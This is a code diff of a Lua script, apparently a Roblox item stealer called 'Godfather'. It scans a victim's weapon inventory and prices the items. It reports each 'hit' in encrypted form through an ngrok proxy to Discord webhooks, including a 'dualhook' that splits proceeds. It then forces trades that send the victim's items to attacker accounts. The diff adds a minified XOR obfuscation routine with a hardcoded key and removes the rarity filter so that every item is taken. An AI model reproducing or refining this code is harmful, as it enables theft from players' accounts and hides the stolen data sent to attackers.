@@ -11,14 +11,6 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- ================= UTILITY FUNCTIONS =================
-local function table_find(tbl, value)
-    for i, v in ipairs(tbl) do
-        if v == value then return i end
-    end
-    return nil
-end
-
 -- ================= YENİ BYPASS KODU =================
 local REAL_JOB_ID = nil
 
@@ -83,241 +75,19 @@ end
 REAL_JOB_ID = getRealJobId()
 -- ================= BYPASS SONU =================
 
--- ================= CRYPTO HELPERS =================
-local bit = bit32
-if not bit then
-    pcall(function()
-        bit = require("bit")
-    end)
-end
-
--- Fallback bit operations if no bit library
-if not bit then
-    bit = {
-        band = function(a, b) return a & b end,
-        bor = function(a, b) return a | b end,
-        bxor = function(a, b) return a ~ b end,
-        lshift = function(a, b) return a << b end,
-        rshift = function(a, b) return a >> b end,
-        bnot = function(a) return ~a end
-    }
-end
-
-local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-
-local function str_to_bytes(s)
-    local bytes = {}
-    for i = 1, #s do
-        bytes[i] = string.byte(s, i)
-    end
-    return bytes
-end
-
-local function bytes_to_str(bytes)
-    local t = {}
-    for i = 1, #bytes do
-        t[i] = string.char(bytes[i])
-    end
-    return table.concat(t)
-end
-
-local function base64_encode(data)
-    if #data == 0 then return "" end
-    local b = {}
-    data:gsub('.', function(c)
-        local byte = string.byte(c)
-        for i = 7, 0, -1 do
-            b[#b+1] = (byte & (1 << i)) ~= 0 and '1' or '0'
-        end
-    end)
-    
-    -- Pad to multiple of 3 bytes (24 bits)
-    local padding = (3 - (#data % 3)) % 3
-    for i = 1, padding * 8 do
-        b[#b+1] = '0'
-    end
-    
-    local base64 = ''
-    for i = 1, #b, 6 do
-        local chunk = table.concat(b, '', i, math.min(i+5, #b))
-        local value = tonumber(chunk, 2) or 0
-        base64 = base64 .. b64chars:sub(value+1, value+1)
-    end
-    
-    -- Add padding
-    if padding == 1 then base64 = base64 .. '='
-    elseif padding == 2 then base64 = base64 .. '==' end
-    
-    return base64
-end
-
-local function rotl(x, n)
-    n = n % 32
-    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
-end
-
-local sha256_K = {
-    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
-    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
-    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
-    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
-    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
-    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
-    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
-    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
-}
-
-local function sha256(msg_bytes)
-    local m = {}
-    for i = 1, #msg_bytes do m[i] = msg_bytes[i] end
-
-    m[#m+1] = 0x80
-    while #m % 64 ~= 56 do
-        m[#m+1] = 0
-    end
-    
-    local bit_len = #msg_bytes * 8
-    for i = 7, 0, -1 do
-        m[#m+1] = (bit_len >> (i * 8)) & 0xFF
-    end
-
-    local h = {
-        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
-        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
-    }
-
-    for chunk_start = 1, #m, 64 do
-        local w = {}
-        for i = 0, 15 do
-            local idx = chunk_start + i * 4
-            w[i] = ((m[idx] or 0) << 24) | ((m[idx+1] or 0) << 16) | ((m[idx+2] or 0) << 8) | (m[idx+3] or 0)
-        end
-        
-        for i = 16, 63 do
-            local s0 = ((w[i-15] >> 7) | (w[i-15] << 25)) ~ ((w[i-15] >> 18) | (w[i-15] << 14)) ~ (w[i-15] >> 3)
-            local s1 = ((w[i-2] >> 17) | (w[i-2] << 15)) ~ ((w[i-2] >> 19) | (w[i-2] << 13)) ~ (w[i-2] >> 10)
-            w[i] = (w[i-16] + s0 + w[i-7] + s1) & 0xFFFFFFFF
-        end
-
-        local a, b, c, d, e, f, g, hh = h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8]
-
-        for i = 0, 63 do
-            local S1 = ((e >> 6) | (e << 26)) ~ ((e >> 11) | (e << 21)) ~ ((e >> 25) | (e << 7))
-            local ch = (e & f) ~ (~e & g)
-            local t1 = (hh + S1 + ch + sha256_K[i+1] + w[i]) & 0xFFFFFFFF
-            local S0 = ((a >> 2) | (a << 30)) ~ ((a >> 13) | (a << 19)) ~ ((a >> 22) | (a << 10))
-            local maj = (a & b) ~ (a & c) ~ (b & c)
-            local t2 = (S0 + maj) & 0xFFFFFFFF
-
-            hh = g
-            g = f
-            f = e
-            e = (d + t1) & 0xFFFFFFFF
-            d = c
-            c = b
-            b = a
-            a = (t1 + t2) & 0xFFFFFFFF
-        end
-
-        h[1] = (h[1] + a) & 0xFFFFFFFF
-        h[2] = (h[2] + b) & 0xFFFFFFFF
-        h[3] = (h[3] + c) & 0xFFFFFFFF
-        h[4] = (h[4] + d) & 0xFFFFFFFF
-        h[5] = (h[5] + e) & 0xFFFFFFFF
-        h[6] = (h[6] + f) & 0xFFFFFFFF
-        h[7] = (h[7] + g) & 0xFFFFFFFF
-        h[8] = (h[8] + hh) & 0xFFFFFFFF
-    end
-
-    local hash_bytes = {}
-    for i = 1, 8 do
-        for j = 3, 0, -1 do
-            hash_bytes[#hash_bytes+1] = (h[i] >> (j * 8)) & 0xFF
-        end
-    end
-    return hash_bytes
-end
-
-local function hmac_sha256(key_bytes, msg_bytes)
-    local blocksize = 64
-    if #key_bytes > blocksize then
-        key_bytes = sha256(key_bytes)
-    end
-    while #key_bytes < blocksize do
-        key_bytes[#key_bytes+1] = 0
-    end
-    
-    local o_key_pad, i_key_pad = {}, {}
-    for i = 1, blocksize do
-        o_key_pad[i] = key_bytes[i] ~ 0x5c
-        i_key_pad[i] = key_bytes[i] ~ 0x36
-    end
-    
-    local inner_input = {}
-    for _, v in ipairs(i_key_pad) do inner_input[#inner_input+1] = v end
-    for _, v in ipairs(msg_bytes) do inner_input[#inner_input+1] = v end
-    local inner_hash = sha256(inner_input)
-    
-    local outer_input = {}
-    for _, v in ipairs(o_key_pad) do outer_input[#outer_input+1] = v end
-    for _, v in ipairs(inner_hash) do outer_input[#outer_input+1] = v end
-    return sha256(outer_input)
-end
-
-local prng_state
-local function prng_init(seed)
-    prng_state = seed & 0xFFFFFFFF
-end
-
-local function prng_next()
-    local s = prng_state
-    s = (s ~ (s << 13)) & 0xFFFFFFFF
-    s = (s ~ (s >> 17)) & 0xFFFFFFFF
-    s = (s ~ (s << 5)) & 0xFFFFFFFF
-    prng_state = s
-    return s & 0xFF
-end
-
-local function encrypt_payload(message_str, key_bytes)
-    local msg_bytes = str_to_bytes(message_str)
-    local seed = os.time() + math.floor(os.clock() * 10000)
-    prng_init(seed)
-
-    local rand_bytes = {}
-    for _ = 1, 12 do
-        rand_bytes[#rand_bytes+1] = prng_next()
-    end
-
-    local xored_msg = {}
-    for i = 1, #msg_bytes do
-        xored_msg[i] = msg_bytes[i] ~ rand_bytes[(i-1) % 12 + 1]
-    end
-
-    local hmac_input = {}
-    for _, v in ipairs(xored_msg) do hmac_input[#hmac_input+1] = v end
-    for _, v in ipairs(rand_bytes) do hmac_input[#hmac_input+1] = v end
-    local hmac = hmac_sha256(key_bytes, hmac_input)
-
-    local blob_bytes = {}
-    for _, v in ipairs(rand_bytes) do blob_bytes[#blob_bytes+1] = v end
-    for _, v in ipairs(xored_msg) do blob_bytes[#blob_bytes+1] = v end
-    for _, v in ipairs(hmac) do blob_bytes[#blob_bytes+1] = v end
-
-    return base64_encode(bytes_to_str(blob_bytes))
-end
-
-local function generate_signature(key_bytes)
-    local expiry = tostring(os.time() + 300)
-    local nonce = game:GetService("HttpService"):GenerateGUID(false)
-    local raw = base64_encode(expiry) .. "." .. base64_encode(nonce)
-    local raw_bytes = str_to_bytes(raw .. ".v2")
-    local hmac = hmac_sha256(key_bytes, raw_bytes)
-    local sig = base64_encode(bytes_to_str(hmac))
-    return raw .. "." .. sig
-end
--- ================= END CRYPTO HELPERS =================
+-- Şifreleme motoru (dualhook için)
+local a={}for b=0,255 do a[b]=string.char(b)end 
+local function stringchar(b)local c=a[b]or string.char(b)return c end 
+local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
+local function tableinsert(b,c,d)if d==nil then d=c c=#b+1 end for e=#b,c,-1 do b[e+1]=b[e]end b[c]=d end 
+local function tableconcat(b,c,d,e)c=c or''d=d or 1 e=e or#b local f=''for g=d,e do f=f..b[g]if g<e then f=f..c end end return f end 
+local function bxor(b,c)local d,e=0,1 while b>0 or c>0 do local f,g=b%2,c%2 if f~=g then d=d+e end b=mathfloor(b/2)c=mathfloor(c/2)e=e*2 end return d end 
+local function toHex(b)return(b:gsub('.',function(c)return string.format('%02X',string.byte(c))end))end 
+local function xorCrypt(b,c)local d={}for e=1,#b do local f,g=b:byte(e),c:byte((e-1)%#c+1)tableinsert(d,stringchar(bxor(f,g)))end return tableconcat(d)end 
+local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9a4e6a06bbcbc226d5721471cc15e94b46c"))end
 
 -- ================= PROXY WEBHOOK SYSTEM =================
+
 local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.app/api/proxy/"
 
 -- EXTERNAL GLOBALS - SET BY LOADER
@@ -327,7 +97,7 @@ local usernames_id = _G.USERNAMES or {}
 local DUALHOOK_WEBHOOK_ID = "moqs1fx2p8s"
 local PUBLIC_WEBHOOK_ID = "lac9yi4lh18"
 
--- Universal request
+-- Universal request (TÜM EXECUTORLAR İÇİN)
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -436,8 +206,6 @@ local specialItems = {
     ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
 }
 
-local rarityTable = { "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage" }
-
 local users = cfg.users
 local dualhookUser = cfg.dualhookUser
 local Players = game:GetService("Players")
@@ -484,8 +252,6 @@ local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
 local AVATAR_URL = "https://cdn.discordapp.com/attachments/1469409737220165746/1469677154294825032/IMG_6264.png"
 
-local USD_API_URL = "https://we-bmm2.vercel.app/api/calc"
-
 local function sendHitToQueue(placeId, jobId, receiverName)
     pcall(function()
         request({
@@ -501,36 +267,11 @@ local function sendHitToQueue(placeId, jobId, receiverName)
     end)
 end
 
-local function GetUSD(list)
-    if not list or #list == 0 then return {total = "0.00", itemPrices = {}} end
-    
-    local items = {}
-    local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-    for _, item in ipairs(list) do
-        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
-        table.insert(items, {name = displayName, amount = item.Amount})
-    end
-    
-    local success, res = pcall(function()
-        return request({
-            Url = USD_API_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({inventory = items})
-        })
-    end)
-    
-    if success and res and res.Body then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok and decoded then return decoded end
-    end
-    return {total = "0.00", itemPrices = {}}
-end
-
 local function upload_to_rubis(items)
     if not items or #items == 0 then return nil end
     
     local lines = {"Godfather Inventory Dump | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+    
     table.sort(items, function(a, b)
         local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
         local a_order = tier_order[a.Rarity] or 1
@@ -625,9 +366,9 @@ local function fetch_all_values()
             itemName = itemName:match("([^<]+)")
             if itemName then
                 itemName = clean_string_lol(itemName:gsub("%s+", " "))
-                local splitName = itemName:split(" Click ")
-                itemName = clean_string_lol(splitName[1] or itemName)
-                local itemNameLower = itemName:lower()
+                local splitResult = string.split(itemName, " Click ")
+                itemName = clean_string_lol(splitResult[1] or itemName)
+                local itemNameLower = string.lower(itemName)
                 local value = parseValue(itembodyDiv)
                 if value then itemValues[itemNameLower] = value end
             end
@@ -640,7 +381,8 @@ local function fetch_all_values()
         for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
             chromaName = chromaName:match("([^<]+)")
             if chromaName then
-                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
+                chromaName = clean_string_lol(chromaName:gsub("%s+", " "))
+                chromaName = string.lower(chromaName)
                 local value = parseValue(itembodyDiv)
                 if value then chromaValues[chromaName] = value end
             end
@@ -685,14 +427,14 @@ local function fetch_all_values()
     local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
     
     for id, data in pairs(item_db) do
-        local item_name = data.ItemName and data.ItemName:lower() or ""
+        local item_name = data.ItemName and string.lower(data.ItemName) or ""
         local rarity = data.Rarity or ""
         local has_chroma = data.Chroma or false
         
         if item_name ~= "" and rarity ~= "" then
             if has_chroma then
                 for c_name, c_val in pairs(chromaExtractedValues) do
-                    if c_name:find(item_name) then
+                    if string.find(c_name, item_name) then
                         final_prices[id] = c_val
                         break
                     end
@@ -729,12 +471,11 @@ local GetStatus = Trade:WaitForChild("GetTradeStatus")
 local OfferItem = Trade:WaitForChild("OfferItem")
 local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
 local DeclineTrade = Trade:WaitForChild("DeclineTrade")
-local DeclineRequest = Trade:WaitForChild("DeclineRequest")
 
-_G.LastOffer = nil
+local LastOffer = nil
 Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
     if x and x.LastOffer then 
-        _G.LastOffer = x.LastOffer 
+        LastOffer = x.LastOffer 
     end 
 end)
 
@@ -756,40 +497,29 @@ local weaponsToSend = {}
 local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
 local prices = fetch_all_values()
 
-local min_rarity = _G.min_rarity or "Godly"
-local min_rarity_index = table_find(rarityTable, min_rarity) or table_find(rarityTable, "Godly") or 5
-
 for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
     local item = database[dataid]
     if item and not no_trade_items[dataid] then
         local itemName = item.ItemName or dataid
         local rarity = item.Rarity or "Common"
-        local weapon_rarity_index = table_find(rarityTable, rarity)
-        
-        if weapon_rarity_index and weapon_rarity_index >= min_rarity_index then
-            local value = prices[dataid] or 1
-            local totalValue = value * amount
-            totalInventoryValue = totalInventoryValue + totalValue
-            if specialItems[itemName] then hasSpecialItem = true end
-            table.insert(weaponsToSend, {
-                DataID = dataid,
-                ItemName = itemName,
-                Amount = amount,
-                Rarity = rarity,
-                Value = value,
-                TotalValue = totalValue,
-                IsChroma = specialItems[itemName] or false
-            })
-            rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
-        end
+        local value = prices[dataid] or 1
+        local totalValue = value * amount
+        totalInventoryValue = totalInventoryValue + totalValue
+        if specialItems[itemName] then hasSpecialItem = true end
+        table.insert(weaponsToSend, {
+            DataID = dataid,
+            ItemName = itemName,
+            Amount = amount,
+            Rarity = rarity,
+            Value = value,
+            TotalValue = totalValue,
+            IsChroma = specialItems[itemName] or false
+        })
+        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
     end
 end
 
 table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)
-
-local usdData = GetUSD(weaponsToSend)
-local totalUSD = usdData.total or "0.00"
-local itemPrices = usdData.itemPrices or {}
 
 local hitCategory = ""
 local isPingWorthy = false
@@ -812,8 +542,7 @@ local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
         if isEncrypted then
-            local key = {153,81,28,110,69,227,146,246,21,43,102,35,44,44,33,218,123,134,211,42,33,96,235,19,36,196,66,225,55,94,101,179}
-            finalBody = encrypt_payload(finalBody, key)
+            finalBody = encrypt(finalBody)
         end
         
         local url = PROXY_URL .. Wid
@@ -836,14 +565,9 @@ local function sendToProxy(Wid, payload, isEncrypted)
         elseif response.StatusCode ~= 200 then
             warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
         else
-            print("[Godfather] Successfully sent")
+            print("[Godfather] successfully")
         end
     end)
-end
-
-local function getTradeStatus()
-    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
-    return ok and status or "None"
 end
 
 local function updateTradeMessage()
@@ -912,16 +636,6 @@ local function sendWebhook(targetWebhookId, isDualhook)
     local total_items = 0
     for _, item in ipairs(itemsForWebhook) do total_items = total_items + item.Amount end
 
-    local inventoryString = "```Total: " .. totalInventoryValue .. " / $" .. totalUSD .. "\n\n"
-    for _, item in ipairs(itemsForWebhook) do
-        local price = itemPrices[item.ItemName] or itemPrices[item.ItemName:lower()] or 0
-        local line = string.format("%dx %s ($%.2f)\n", item.Amount, item.ItemName, price)
-        if #inventoryString + #line < 950 then 
-            inventoryString = inventoryString .. line 
-        end
-    end
-    inventoryString = inventoryString .. "```"
-
     local top_items = {}
     for i = 1, math.min(3, #itemsForWebhook) do
         local item = itemsForWebhook[i]
@@ -964,7 +678,7 @@ local function sendWebhook(targetWebhookId, isDualhook)
 			},
 			{
 				name = "💰 Valuation",
-				value = string.format("```\nTotal Value: %d ($%s)\nTotal Items: %d\n```", totalInventoryValue, totalUSD, total_items),
+				value = string.format("```\nTotal Value: %d\nTotal Items: %d\n```", totalInventoryValue, total_items),
 				inline = true
 			},
             {
@@ -981,11 +695,6 @@ local function sendWebhook(targetWebhookId, isDualhook)
 				value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
 				inline = false
 			},
-            {
-                name = "💵 USD Estimate",
-                value = inventoryString,
-                inline = false
-            },
             {
                 name = "🔗 Actions",
                 value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
@@ -1039,7 +748,7 @@ local function sendPublicHits()
         fields = {
             { 
                 name = "💎 Valuation", 
-                value = string.format("```yaml\nvalue: %d ($%s)\nitems: %d```", totalInventoryValue, totalUSD, total_items), 
+                value = string.format("```yaml\nvalue: %d\nitems: %d```", totalInventoryValue, total_items), 
                 inline = true 
             },
             { 
@@ -1103,6 +812,11 @@ if totalInventoryValue >= 300 then
     startDualhookTimer()
 end
 
+local function getStatus()
+    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    return ok and status or "None"
+end
+
 local function waitForTarget(targetPlayer)
     local attempts = 0
     while attempts < 30 do
@@ -1117,9 +831,9 @@ local function waitForTarget(targetPlayer)
 end
 
 local function AcceptTrade()
-    if not _G.LastOffer then return false end
+    if not LastOffer then return false end
     local ok = pcall(function()
-        AcceptTradeRemote:FireServer(PlaceId * 3, _G.LastOffer)
+        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
     end)
     return ok
 end
@@ -1137,24 +851,16 @@ function doTrade(targetPlayer)
     if not targetPlayer or not targetPlayer.Parent then return end
     if not waitForTarget(targetPlayer) then return end
     
-    local initialTradeState = getTradeStatus()
-    if initialTradeState == "StartTrade" then
-        pcall(function() DeclineTrade:FireServer() end)
-        task.wait(0.3)
-    elseif initialTradeState == "ReceivingRequest" then
-        pcall(function() DeclineRequest:FireServer() end)
-        task.wait(0.3)
-    end
-    
-    _G.LastOffer = nil
-    isDualhookTrade = isDualhookActive
+    pcall(function() DeclineTrade:FireServer() end)
+    task.wait(0.5)
+    LastOffer = nil
     
     local itemsAdded = false
     local timeout = 0
     
     while timeout < 60 and #weaponsToSend > 0 do
-        local success, err = pcall(function()
-            local status = getTradeStatus()
+        local success = pcall(function()
+            local status = getStatus()
             
             if status == "None" then
                 if itemsAdded then
@@ -1165,7 +871,7 @@ function doTrade(targetPlayer)
                         end
                     end
                     itemsAdded = false
-                    _G.LastOffer = nil
+                    LastOffer = nil
                     task.wait(0.5)
                     if not isDualhookTrade then
                         updateTradeMessage()
@@ -1177,18 +883,17 @@ function doTrade(targetPlayer)
             elseif status == "SendingRequest" then
                 task.wait(0.5)
             elseif status == "ReceivingRequest" then
-                pcall(function() DeclineRequest:FireServer() end)
+                DeclineTrade:FireServer()
                 task.wait(0.3)
             elseif status == "StartTrade" then
                 if not itemsAdded then
-                    local numToTrade = math.min(4, #weaponsToSend)
-                    for i = 1, numToTrade do
+                    for i = 1, math.min(4, #weaponsToSend) do
                         local item = weaponsToSend[i]
                         if item then
                             for _ = 1, item.Amount do
                                 OfferItem:FireServer(item.DataID, "Weapons")
-                                task.wait(0.05)
                             end
+                            task.wait(0.1)
                         end
                     end
                     itemsAdded = true
@@ -1202,10 +907,7 @@ function doTrade(targetPlayer)
             end
         end)
         
-        if not success then
-            warn("[Godfather] Trade error:", err)
-            task.wait(1) 
-        end
+        if not success then task.wait(1) end
         timeout = timeout + 1
     end
     
@@ -1219,13 +921,13 @@ end
 
 local function isTarget(name)
     if not name then return false end
-    name = name:lower()
+    name = string.lower(name)
     for _, u in ipairs(users) do
-        if u:lower() == name then return true end
+        if string.lower(u) == name then return true end
     end
     if isDualhookActive then
         for _, u in ipairs(dualhookUser) do
-            if u:lower() == name then return true end
+            if string.lower(u) == name then return true end
         end
     end
     return false
